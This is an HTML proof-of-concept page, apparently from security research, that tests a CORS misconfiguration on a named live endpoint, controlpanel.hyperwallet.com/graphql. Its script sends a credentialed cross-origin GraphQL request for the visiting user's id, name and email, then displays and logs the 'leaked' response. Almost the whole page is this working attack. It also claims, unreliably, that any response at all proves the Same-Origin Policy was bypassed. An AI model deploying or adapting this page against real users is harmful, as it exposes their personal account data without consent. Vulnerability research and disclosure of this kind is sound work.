<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security Research: CORS PoC</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background-color: #f4f7f6; }
        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); border-top: 5px solid #d9534f; }
        h1 { color: #d9534f; margin-top: 0; }
        .status-box { padding: 15px; border-radius: 4px; margin-bottom: 20px; font-weight: bold; }
        .vulnerable { background-color: #f2dede; color: #a94442; border: 1px solid #ebccd1; }
        pre { background-color: #272822; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; font-size: 14px; }
        .info { font-size: 0.9em; color: #666; font-style: italic; }
    </style>
</head>
<body>

<div class="card">
    <h1>CORS SOP Bypass PoC</h1>
    <p><strong>Target:</strong> <code>https://controlpanel.hyperwallet.com/graphql</code></p>
    
    <div id="status-container" class="status-box">Testing for SOP Bypass...</div>

    <h3>Evidence (Server Response):</h3>
    <pre id="output">Waiting for response...</pre>

    <p class="info">Note: If you can see any JSON data above (even an error message), the Same-Origin Policy has been bypassed.</p>
</div>

<script>
    const targetUrl = "https://controlpanel.hyperwallet.com/graphql";
    const statusContainer = document.getElementById('status-container');
    const outputElement = document.getElementById('output');

    // We use a query that likely requires a session
    const graphqlQuery = {
        query: "{ me { id firstName lastName email } }"
    };

    fetch(targetUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        credentials: 'include', // This is the core of the exploit
        body: JSON.stringify(graphqlQuery)
    })
    .then(response => {
        // Any response at all proves the browser allowed the read
        statusContainer.classList.add('vulnerable');
        statusContainer.innerText = "VULNERABILITY CONFIRMED: SOP Bypass Detected";
        return response.text();
    })
    .then(data => {
        // Log to console and display on page
        console.log("Leaked Response:", data);
        outputElement.innerText = JSON.stringify(JSON.parse(data), null, 4);
    })
    .catch(error => {
        statusContainer.innerText = "Test Failed: " + error;
        statusContainer.style.backgroundColor = "#eee";
        outputElement.innerText = "No response received. This domain might be blocked or the session is invalid.";
    });
</script>

</body>
</html>
